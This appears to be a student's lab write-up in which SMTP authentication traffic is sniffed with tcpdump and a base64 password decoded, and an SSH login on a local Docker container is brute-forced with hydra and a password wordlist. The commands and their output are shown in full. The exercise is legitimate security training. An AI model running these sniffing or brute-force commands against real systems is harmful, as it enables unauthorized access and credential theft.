## Attack is the best defense

### For task 1 -


> Process
>> in `terminal 1`
```
sudo tcpdump -i eth0 port 587 -w smtp_capture.pcap
```

>> in `terminal 2`
```
./user_authenticating_into_server
```
when `./user_authenticating_into_server` finishes executing, stop process in `terminal 1`

then
`tcpdump -A -r smtp_capture.pcap` to inspect the sniffed data

#### Result
I got `bXlwYXNzd29yZDk4OTgh` as the probable password

using `echo "bXlwYXNzd29yZDk4OTgh" | base64 --decode` I got `mypassword9898!` as the password


### For task 2 -

> Process
>> After starting the docker container/server -
```sudo docker run -p 2222:22 -d -ti sylvainkalache/264-1```
and cleaning the ./password_dictionary.txt file (retaining only passwords of char. length 11) -
```sed -i '/^.\{11\}$/!d' password_dictionary.txt```

I used
```hydra -l sylvain -P ./password_dictionary.txt -s 2222 ssh://127.0.0.1```

#### Result
I got the hydra response
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-07 13:55:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 22495 login tries (l:1/p:22495), ~1406 tries per task
[DATA] attacking ssh://127.0.0.1:2222/
[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
1 of 1 target successfully completed, 1 valid password found
```
with `password123` as the password

### Resources
password_dictionary.txt source is the Kaggle bruteforce-database-password-dictionaries originally named
`1000000-password-seclists.txt` - [Download Repo](https://www.kaggle.com/datasets/taranvee/bruteforce-database-password-dictionaries?resource=download)
